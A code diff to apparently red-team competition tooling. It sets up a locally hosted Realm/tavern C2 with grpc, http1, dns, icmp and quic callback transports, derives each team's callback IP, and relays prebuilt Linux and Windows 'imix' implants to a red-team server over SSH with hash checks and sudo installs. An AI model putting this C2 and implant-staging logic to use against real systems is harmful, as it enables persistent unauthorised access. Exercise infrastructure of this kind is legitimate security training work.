@@ -154,12 +154,107 @@ def load_bad_auto_config(config_path=None):
     return data
 
 
-def apply_local_c2(realm, red_ip):
+def default_transport_table(c2_port=DEFAULT_C2_PORT):
+    """The full five-transport callback table a local C2 serves.
+
+    gw_port is what the engine DNAT exposes on the team transit
+    (172.31.<identifier>.1); c2_port is the red01-side listener (tavern core for
+    grpc, a redirector for the rest). Mirrors REDIRECTOR_PORTS and the
+    provision script's listen checks.
+    """
+    return {
+        "grpc": {"gw_port": c2_port, "c2_port": c2_port},
+        "http1": {"gw_port": REDIRECTOR_PORTS["http1"],
+                  "c2_port": REDIRECTOR_PORTS["http1"]},
+        "dns": {"gw_port": 53, "c2_port": REDIRECTOR_PORTS["dns"],
+                "domain": DEFAULT_DNS_DOMAIN},
+        "icmp": {},
+        "quic": {"gw_port": REDIRECTOR_PORTS["quic"],
+                 "c2_port": REDIRECTOR_PORTS["quic"]},
+    }
+
+
+def team_identifier(comp_dir):
+    """The comp's first team identifier from teams.json, or None."""
+    try:
+        teams = json.loads((Path(comp_dir) / "teams.json").read_text(encoding="utf-8"))
+    except (OSError, ValueError):
+        return None
+    for tv in teams.values():
+        try:
+            return int(tv["identifier"])
+        except (KeyError, TypeError, ValueError):
+            continue
+    return None
+
+
+def callback_ip_for(comp_dir):
+    """The engine transit IP the team boxes dial for the C2.
+
+    The in-path firewall hands team <id> the transit 172.31.<id>.1; the engine
+    DNATs the transport gw_ports there to red01. Missing teams.json -> None
+    (the caller refuses — a beacon DSN without it aims at nothing).
+    """
+    ident = team_identifier(comp_dir)
+    return f"172.31.{ident}.1" if ident is not None else None
+
+
+def missing_local_c2_keys(realm):
+    """The keys whose absence means a DARK C2: transports/callback_ip.
+
+    A realm block without them deploys cleanly, prints "tavern live … all
+    transports", seeds `implant: True` flags — and plants one dead legacy http1
+    beacon per box with no engine DNAT (live 2026-10-11). Every local-C2 entry
+    point validates against this before anything deploys.
+    """
+    realm = realm or {}
+    out = []
+    transports = realm.get("transports")
+    if not (isinstance(transports, dict) and transports):
+        out.append("transports")
+    if not realm.get("callback_ip"):
+        out.append("callback_ip")
+    return out
+
+
+def synthesize_realm_block(realm, callback_ip=None):
+    """Fill in everything a local-C2 realm block needs, in place.
+
+    The operator's sibling config.yaml historically carried a skeletal realm
+    block (enabled/base_url at most); deploying that verbatim is the dark-C2
+    failure above. Operator-set values win; only gaps get the defaults.
+    """
+    realm = realm if isinstance(realm, dict) else {}
+    c2_port = int(realm.get("c2_port") or DEFAULT_C2_PORT)
+    defaults = default_transport_table(c2_port)
+    have = realm.get("transports")
+    if isinstance(have, dict) and have:
+        for t, spec in defaults.items():
+            if isinstance(have.get(t), dict):
+                for k, v in spec.items():
+                    have[t].setdefault(k, v)
+            else:
+                have[t] = spec
+    else:
+        realm["transports"] = defaults
+    if callback_ip:
+        realm.setdefault("callback_ip", callback_ip)
+    realm.setdefault("mcp_path", "/mcp")
+    realm.setdefault("install_dir", INSTALL_DIR)
+    realm.setdefault("interval", 10)
+    realm.setdefault("multi_beacon", True)
+    realm.setdefault("rawsock_budget", 2)
+    return realm
+
+
+def apply_local_c2(realm, red_ip, callback_ip=None):
     """Retarget a realm config block at a red01-hosted tavern (in place).
 
     c2_ip/base_url/verify_url all become the redteam server itself: the engine
     DNAT points its transport ports at red01, and bad-auto's MCP/verify traffic
-    (which runs ON red01) goes over loopback-equivalent addressing.
+    (which runs ON red01) goes over loopback-equivalent addressing. The FULL
+    realm block is synthesized here (transports/callback_ip/multi-beacon knobs)
+    so a skeletal operator config can no longer deploy a dark C2.
     """
     realm = realm if isinstance(realm, dict) else {}
     realm["enabled"] = True
@@ -168,10 +263,10 @@ def apply_local_c2(realm, red_ip):
     realm["c2_ip"] = red_ip
     realm["base_url"] = f"http://{red_ip}:{c2_port}"
     realm["verify_url"] = realm["base_url"]
-    return realm
+    return synthesize_realm_block(realm, callback_ip)
 
 
-def build_local_c2_config(red_ip, config_path=None):
+def build_local_c2_config(red_ip, config_path=None, comp_dir=None):
     """The bad-auto config for a deploy whose tavern lives on red01.
 
     Returns None when the sibling config is missing or realm is disabled
@@ -187,7 +282,8 @@ def build_local_c2_config(red_ip, config_path=None):
     realm = cfg.get("realm")
     if realm is not None and realm.get("enabled") is False:
         return None
-    apply_local_c2(cfg.setdefault("realm", {}), red_ip)
+    apply_local_c2(cfg.setdefault("realm", {}),
+                   red_ip, callback_ip_for(comp_dir) if comp_dir else None)
     cfg.setdefault("deploy", {})["red_ip"] = red_ip
     return cfg
 
@@ -218,17 +314,27 @@ def prepare_local_c2(comp_dir, red_ip):
     `<comp_dir>/credentials.txt` — which only works when that path is absolute
     (see red_plant_ops._deploy_red). Setting it here makes the deployed config
     self-sufficient.
+
+    Raises ValueError when the synthesized block is STILL incomplete (no
+    teams.json to derive callback_ip from): deploying it would plant dead
+    beacons under a "tavern live" banner, so the caller refuses loudly instead.
     """
     if not (BAD_AUTO / "config.yaml").exists():
         print("  realm-c2: no bad-auto config.yaml — C2 stays on its configured host")
         return None, None
-    cfg = build_local_c2_config(red_ip)
+    cfg = build_local_c2_config(red_ip, comp_dir=comp_dir)
     if cfg is None:
         print("  realm-c2: realm disabled in bad-auto config — no tavern to provision")
         return None, None
     engine_ip = engine_ip_for(comp_dir)
     if engine_ip and not (cfg.get("deploy") or {}).get("engine_ip"):
         cfg.setdefault("deploy", {})["engine_ip"] = engine_ip
+    missing = missing_local_c2_keys(cfg["realm"])
+    if missing:
+        raise ValueError(
+            "derived realm block is missing " + "/".join(missing) + " — a local-C2 "
+            f"deploy without them plants dead beacons while reporting success "
+            f"(teams.json readable? identifier present? comp dir: {comp_dir})")
     return write_local_c2_config(comp_dir, cfg), cfg["realm"]
 
 
@@ -485,6 +591,122 @@ def _scp(ssh_key, *args, timeout=180):
         capture_output=True, text=True, timeout=timeout)
 
 
+# The workstation reaches the estate over tailscale at ~30 KB/s bulk, so the
+# implant relay streams gzip on the wire and each leg gets a generous bound
+# (the old 180 s per-leg scp timeout could not move ~18 MB even uncompressed).
+RELAY_LEG_TIMEOUT = 900
+
+
+def _gzip_pull(ssh_key, host, src, local_gz, timeout=RELAY_LEG_TIMEOUT):
+    """`gzip -c` the file on <host> into a local .gz — compressed on the wire."""
+    with open(local_gz, "wb") as fh:
+        return subprocess.run(
+            ["ssh", *_ssh_base(ssh_key), f"{RED_USER}@{host}",
+             f"gzip -c -- {shlex.quote(src)}"],
+            stdout=fh, stderr=subprocess.PIPE, timeout=timeout)
+
+
+def _gunzip_push(ssh_key, host, local_gz, dst, timeout=RELAY_LEG_TIMEOUT):
+    """Stream a local .gz through `gunzip -c` into `dst` on <host>."""
+    with open(local_gz, "rb") as fh:
+        return subprocess.run(
+            ["ssh", *_ssh_base(ssh_key), f"{RED_USER}@{host}",
+             f"mkdir -p /tmp/.realm-c2-stage && gunzip -c > {shlex.quote(dst)}"],
+            stdin=fh, stderr=subprocess.PIPE, timeout=timeout)
+
+
+def _sha256_on(ssh_key, host, path, timeout=90):
+    """The file's sha256 as <host> sees it, or None when unreadable."""
+    run = _ssh(ssh_key, host, f"sha256sum -- {shlex.quote(path)}", timeout=timeout)
+    m = re.search(r"\b[0-9a-f]{64}\b", run.stdout or "")
+    return m.group(0) if m and run.returncode == 0 else None
+
+
+def _relay_err(r, fallback):
+    try:
+        text = (r.stderr or b"").decode(errors="replace")
+    except AttributeError:
+        text = r.stderr or ""
+    return (text.strip() or fallback)[-200:]
+
+
+def stage_implants(ssh_key, red_ip, implant_host, realm=None,
+                   timeout=RELAY_LEG_TIMEOUT):
+    """Relay the prebuilt imix implants implant_host -> red01's staging paths.
+
+    bad-auto's own `_stage_realm` scp's FROM `realm.c2_ip`, which is red01 once
+    this module is in play — so the relay happens here instead, into the exact
+    paths `realm_plant`/`realm_plant_win` upload from.
+
+    Each leg is gzip-streamed (compressed on the wire), bounded by `timeout`
+    seconds per leg, and verified sha256 end-to-end; throughput is printed so a
+    slow uplink is visible instead of a mystery 180 s timeout.
+    """
+    realm = realm or {}
+    # bad-auto's realm_plant reads its own install_dir (default /opt/bad-auto/realm)
+    # from the config the deploy stages onto red01 — stage into the SAME dir or the
+    # plants refuse with "imix not staged".
+    install_dir = realm.get("install_dir") or INSTALL_DIR
+    win_src = realm.get("win_payload") or WIN_IMPLANT_SRC_DEFAULT
+    tmp = tempfile.mkdtemp(prefix="realm-c2-implants-")
+    try:
+        for label, src, dst in (("linux", LINUX_IMPLANT_SRC, "imix"),
+                                ("windows", win_src, WIN_IMPLANT_DST)):
+            gz = Path(tmp) / f"{dst}.gz"
+            t0 = time.time()
+            try:
+                r = _gzip_pull(ssh_key, implant_host, src, gz, timeout=timeout)
+            except subprocess.TimeoutExpired:
+                return {"ok": False, "error":
+                        f"gzip pull of the {label} implant off {implant_host} timed "
+                        f"out after {timeout}s ({src})"}
+            if r.returncode != 0:
+                return {"ok": False, "error":
+                        f"could not pull the {label} implant off {implant_host} "
+                        f"({src}): {_relay_err(r, 'no output')}"}
+            src_sha = _sha256_on(ssh_key, implant_host, src)
+            if not src_sha:
+                return {"ok": False, "error": f"could not hash {src} on {implant_host}"}
+            pull_sec = time.time() - t0
+            t0 = time.time()
+            remote_tmp = f"/tmp/.realm-c2-stage/{dst}"
+            try:
+                r = _gunzip_push(ssh_key, red_ip, gz, remote_tmp, timeout=timeout)
+            except subprocess.TimeoutExpired:
+                return {"ok": False, "error":
+                        f"gzip push of the {label} implant to red01 timed out "
+                        f"after {timeout}s"}
+            if r.returncode != 0:
+                return {"ok": False, "error":
+                        f"could not push the {label} implant to red01: "
+                        f"{_relay_err(r, 'no output')}"}
+            push_sec = time.time() - t0
+            dst_sha = _sha256_on(ssh_key, red_ip, remote_tmp)
+            if dst_sha != src_sha:
+                return {"ok": False, "error":
+                        f"{label} implant sha256 mismatch across the relay "
+                        f"({src_sha} vs {dst_sha}) — re-run staging"}
+            nbytes = gz.stat().st_size
+            print(f"  realm-c2: {label} implant relayed: {nbytes} B wire bytes, "
+                  f"pull {pull_sec:.0f}s ({nbytes / 1024 / max(pull_sec, 0.001):.0f} KiB/s), "
+                  f"push {push_sec:.0f}s ({nbytes / 1024 / max(push_sec, 0.001):.0f} KiB/s)")
+        mv = _ssh(ssh_key, red_ip,
+                  f"sudo -n mkdir -p {install_dir} && "
+                  f"sudo -n mv /tmp/.realm-c2-stage/imix "
+                  f"/tmp/.realm-c2-stage/{WIN_IMPLANT_DST} {install_dir}/ && "
+                  f"sudo -n chmod 755 {install_dir}/imix "
+                  f"{install_dir}/{WIN_IMPLANT_DST} && "
+                  f"rm -rf /tmp/.realm-c2-stage", timeout=60)
+        if mv.returncode != 0:
+            return {"ok": False, "error":
+                    f"red01 refused the implant install: "
+                    f"{(mv.stderr or mv.stdout or '').strip()[-200:]}"}
+        return {"ok": True, "install_dir": install_dir,
+                "implants": ["imix", WIN_IMPLANT_DST]}
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
 # ------------------------------------------------------- server key propagation
 
 _PUBKEY_RE = re.compile(r"public key: ([A-Za-z0-9+/=]{20,})")
@@ -541,56 +763,6 @@ def set_realm_pubkey(ssh_key, red_ip, pubkey, timeout=90):
     return _ssh(ssh_key, red_ip,
                 f"echo {payload} | base64 -d | sudo -n python3 -", timeout=timeout)
 
-
-def stage_implants(ssh_key, red_ip, implant_host, realm=None, timeout=900):
-    """Relay the prebuilt imix implants implant_host -> red01's staging paths.
-
-    bad-auto's own `_stage_realm` scp's FROM `realm.c2_ip`, which is red01 once
-    this module is in play — so the relay happens here instead, into the exact
-    paths `realm_plant`/`realm_plant_win` upload from.
-    """
-    realm = realm or {}
-    # bad-auto's realm_plant reads its own install_dir (default /opt/bad-auto/realm)
-    # from the config the deploy stages onto red01 — stage into the SAME dir or the
-    # plants refuse with "imix not staged".
-    install_dir = realm.get("install_dir") or INSTALL_DIR
-    win_src = realm.get("win_payload") or WIN_IMPLANT_SRC_DEFAULT
-    tmp = tempfile.mkdtemp(prefix="realm-c2-implants-")
-    try:
-        r1 = _scp(ssh_key, f"{RED_USER}@{implant_host}:{LINUX_IMPLANT_SRC}",
-                  f"{tmp}/imix")
-        if r1.returncode != 0:
-            return {"ok": False, "error":
-                    f"could not pull the Linux imix off {implant_host}: "
-                    f"{(r1.stderr or r1.stdout or '').strip()[-200:]}"}
-        r2 = _scp(ssh_key, f"{RED_USER}@{implant_host}:{win_src}",
-                  f"{tmp}/{WIN_IMPLANT_DST}")
-        if r2.returncode != 0:
-            return {"ok": False, "error":
-                    f"could not pull the Windows imix off {implant_host} "
-                    f"({win_src}): {(r2.stderr or r2.stdout or '').strip()[-200:]}"}
-        _ssh(ssh_key, red_ip, "mkdir -p /tmp/.realm-c2-stage", timeout=30)
-        r3 = _scp(ssh_key, f"{tmp}/imix", f"{tmp}/{WIN_IMPLANT_DST}",
-                  f"{RED_USER}@{red_ip}:/tmp/.realm-c2-stage/")
-        if r3.returncode != 0:
-            return {"ok": False, "error":
-                    f"could not push implants to red01: "
-                    f"{(r3.stderr or r3.stdout or '').strip()[-200:]}"}
-        mv = _ssh(ssh_key, red_ip,
-                  f"sudo -n mkdir -p {install_dir} && "
-                  f"sudo -n mv /tmp/.realm-c2-stage/imix "
-                  f"/tmp/.realm-c2-stage/{WIN_IMPLANT_DST} {install_dir}/ && "
-                  f"sudo -n chmod 755 {install_dir}/imix "
-                  f"{install_dir}/{WIN_IMPLANT_DST} && "
-                  f"rm -rf /tmp/.realm-c2-stage", timeout=60)
-        if mv.returncode != 0:
-            return {"ok": False, "error":
-                    f"red01 refused the implant install: "
-                    f"{(mv.stderr or mv.stdout or '').strip()[-200:]}"}
-        return {"ok": True, "install_dir": install_dir,
-                "implants": ["imix", WIN_IMPLANT_DST]}
-    finally:
-        shutil.rmtree(tmp, ignore_errors=True)
 
 
 def provision_realm_c2(comp_dir, red_ip, ssh_key, realm, *,
